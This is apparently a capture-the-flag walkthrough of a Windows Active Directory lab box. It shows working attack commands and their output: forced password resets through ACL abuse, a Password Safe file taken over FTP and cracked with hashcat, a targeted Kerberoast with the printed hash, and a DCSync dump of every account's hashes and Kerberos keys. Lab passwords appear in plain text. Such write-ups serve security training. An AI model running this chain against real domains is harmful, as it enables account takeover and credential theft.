As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Olivia / ichliebedich

#### HOST RECON

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-14 11:53:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
58080/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-14T11:54:50
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```


##### valid users in domain

```
michael@administrator.htb
benjamin@administrator.htb
administrator@administrator.htb
emily@administrator.htb
olivia@administrator.htb
ethan@administrator.htb
emma
alexander
```

## Login as olivia

```
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### Enum with bloodhound show us that Olivia user has GenericAll perm over Michael user and give us some path to explore this. One of this is Force Change Password.

- https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
- https://cyberkhalid.github.io/posts/ad-fcp-user/

```
*Evil-WinRM* PS C:\Users\olivia\Documents> find-interestingdomainacl -resolveguids | ?{$_.identityreferencename -match "olivia"}


ObjectDN                : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1088858960-373806567-254189436-1108
IdentityReferenceName   : olivia
IdentityReferenceDomain : administrator.htb
IdentityReferenceDN     : CN=Olivia Johnson,CN=Users,DC=administrator,DC=htb
IdentityReferenceClass  : user
```


####  Force Change Password attack 

```
*Evil-WinRM* PS C:\Users\olivia\Documents> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\olivia\Documents> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\olivia\Documents> $Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR\michael', $SecPassword)
*Evil-WinRM* PS C:\Users\olivia\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\olivia\Documents> Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword
```

## Login as michael

```
$ evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
```

```
*Evil-WinRM* PS C:\Users\michael\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ============================================
administrator\michael S-1-5-21-1088858960-373806567-254189436-1109


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### With bloodhound data we can see that Michael user has User-Force-Change-Password perm over Benjamin user. To explore is the same way of change michael password.


```
*Evil-WinRM* PS C:\Users\michael\Documents> find-interestingdomainacl -resolveguids | ?{$_.identityreferencename -match "michael"}


ObjectDN                : CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : User-Force-Change-Password
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1088858960-373806567-254189436-1109
IdentityReferenceName   : michael
IdentityReferenceDomain : administrator.htb
IdentityReferenceDN     : CN=Michael Williams,CN=Users,DC=administrator,DC=htb
IdentityReferenceClass  : user
```

#### change benjamin password.

```
*Evil-WinRM* PS C:\Users\michael\Documents> $NewPassword = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $NewPassword
```


#### After change benjamin password, winrm connection not work. Try FTP login as benjamin.

```
$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:ubusec): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||55577|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3 
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||55579|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************|   952        5.92 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (5.88 KiB/s)
ftp> 
```

#### crack password of psafe file.

```
$ hashcat -m 5200 Backup.psafe3 rockyou.txt

Backup.psafe3:tekieromucho
```

#### install passwordsafe client and open db file.

```
$ apt install passwordsafe
```
```
Alexander  =  UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily = UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma = WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

## Login as Emily

```
$ evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

```
*Evil-WinRM* PS C:\Users\emily\Desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ============================================
administrator\emily S-1-5-21-1088858960-373806567-254189436-1112


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### BloodHound data says that Emily user has GenericWrite over Ethan user. The way sujested to explore this is a Shadow Credentials Attack or a Targeted Kerberoast Attack.

- https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting
- https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
- https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab


```
*Evil-WinRM* PS C:\Users\emily\Desktop> find-interestingdomainacl -resolveguids | ?{$_.identityreferencename -match "emily"}


ObjectDN                : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1088858960-373806567-254189436-1112
IdentityReferenceName   : emily
IdentityReferenceDomain : administrator.htb
IdentityReferenceDN     : CN=Emily Rodriguez,CN=Users,DC=administrator,DC=htb
IdentityReferenceClass  : user
```


#### Shadow Creds attack dont work but Targeted Kerberoast work as well outside of machine...

```
└─$ faketime -f +7h ./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.10.11.42
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$d588ddb90aa03475f0d376c068f02ab2$ed02ebbdee6408ed3f07d68140e1556c3bd4110bb77c9efcd82b917919a4d4291f4d1169e24cb98a5d6a7afe9015864c8a94666edb2d3190c957f0ea3aa3b12cba070ad54e54f76e1118e249a4e9693437e1750398857ca1b0dca31265a9c5d6de0bf35d1963f14ef17f41d0e3d3cf447cd628df35df5832c8f3c0c3e47848691103a6af7ca3de6162f97a09024812e0d46d5f3202d598570e81598942bbf33192737efbee8080f9856805cf3eb1c87eb2589afa314bed876e9fe0e7c6b455ff70f64c94c9370db670c462fb737679ce72d1116723bceee060f6dbe45b2ac835e6046b0f2647108ded3ac37ece6a37cd891a84b763ad7a38c52ac5b8cdd669edd98c2113074f77cff35aff10c4866f8f6a00ef79804958b84c3e1fb1a4d5557b00fd34d399ab24d6cd2d0db6e6d79966e77272902182e2885690befadb5698b95404d1e38cee427061c3be1e1f5bb7766d31158373b6f4cdce7c4e42454a78d75b28f2e26f84773d329ed6b48c07ca9dad7433186a4c1b8c7f1c847cfc3bf3f109bf9b4225ed431c78e0d5616f78a499e36f10da80e5ee172b725bbf9caac8a99cf61671c2a017798246676664f8ab1ac0a224ba3f876ae1593a9a67b76f9675e3ed186fb579950d4b3b9d464c201252be0d26ff71ea19934e86261422697e3f9eb6f7c1b8dd3638be1982263fe8a1d42d8e6e0774cbfb99d1e848abf8949cf187e1ecf01059f3195aef69f76f855d41c2dd3b82c677b7e2aa0eaad1ad69d200965593c73a8ba5df104cc54609158a00d41ffb0a212894cbb1ef5806f8357c22beca518a466baa5a2c3985bca1da5f059ec1a13d1373de997855bee94f793acff2e6e55124ab747493fc4d2afa43a72074b7d18d60db078a3492840bbdac7490095e9170c1ce0d5f29e7c25a77784fa982c5e3df9e8f91edd2ee7ececaa551dede2d37484230ea3987b4587d396e70ee5b48ce4ce419541ecdf7b93676f59671f8d709784c20fd39943e64a14934e1b651a0512f87102a2546a95f3ad3f2cc4386ffab07fde7ffee6e9c748a38a37aef281da4017c4c7d62e7d3fc10445a3686a43a7a47e31710476d69efe2df327278e458499d6f5c638a3db02ca1dc8186a21f6d68923504a9c7be628201796103f703d6d785f0d915f34f20dcc86ba2d8b8ede608bb4698194cf1d6fd48adab0ca62229cdf005464786f42c962723eb0a133c0573525e4cf8b00a6432231e500c172f8e6c775ea35bde730b7850574da9459134630bb4612afb2720ac7f868f1deb7683449fad8a8cef1b67045a0a2f4e380a7a560034fbab504660476f137af276d0bb6b391f0220955136360eba42843e3ce5fbf166af36530297a6f96ceb5b2ee963db2e0a5fcaccf36e3a6f3de2994a97b59d18719e973cfbd80d4da072ac09add26313f8f1eee9bb39cb4713ebd475fb96fe411ef3234ba072228879015ee7e1429f4bcfc7d964a8e9c778fd1ba545117695cfec5a68f78a2723357e03a4527fe59e10441e7e321b8e82e9ac1370
[VERBOSE] SPN removed successfully for (ethan)
```

#### Cracked hash

limpbizkit


#### After get Ethan password i try connect via winrm but no success. Looking Ethan perms we see that hes have all perms over Domain (GetChangesInFilteredSet, GetChanges, GetChangesAll) for perform a DCSync attack... As we dont have shell, lets use impacket-secretsdump.

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync 

```
*Evil-WinRM* PS C:\Users\emily\Documents> find-interestingdomainacl -resolveguids | ?{$_.identityreferencename -match "ethan"}


ObjectDN                : DC=administrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes-In-Filtered-Set
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1088858960-373806567-254189436-1113
IdentityReferenceName   : ethan
IdentityReferenceDomain : administrator.htb
IdentityReferenceDN     : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
IdentityReferenceClass  : user

ObjectDN                : DC=administrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1088858960-373806567-254189436-1113
IdentityReferenceName   : ethan
IdentityReferenceDomain : administrator.htb
IdentityReferenceDN     : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
IdentityReferenceClass  : user

ObjectDN                : DC=administrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes-All
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1088858960-373806567-254189436-1113
IdentityReferenceName   : ethan
IdentityReferenceDomain : administrator.htb
IdentityReferenceDN     : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
IdentityReferenceClass  : user
```

#### DCSync

```
$ impacket-secretsdump administrator/ethan:limpbizkit@10.10.11.42
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:7a206ee05e894781b99a0175a7fe6f7e1242913b2ab72d0a797cc45968451142
administrator.htb\michael:aes128-cts-hmac-sha1-96:b0f3074aa15482dc8b74937febfa9c7e
administrator.htb\michael:des-cbc-md5:2586dc58c47c61f7
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:1c2dfc045736861ac53d07c3d95425f7b681fd473a6ed46f5571ebdc67860541
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:9f56205e5b80b9d69ffcead11fbb3583
administrator.htb\benjamin:des-cbc-md5:940101e6cd02d007
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
```

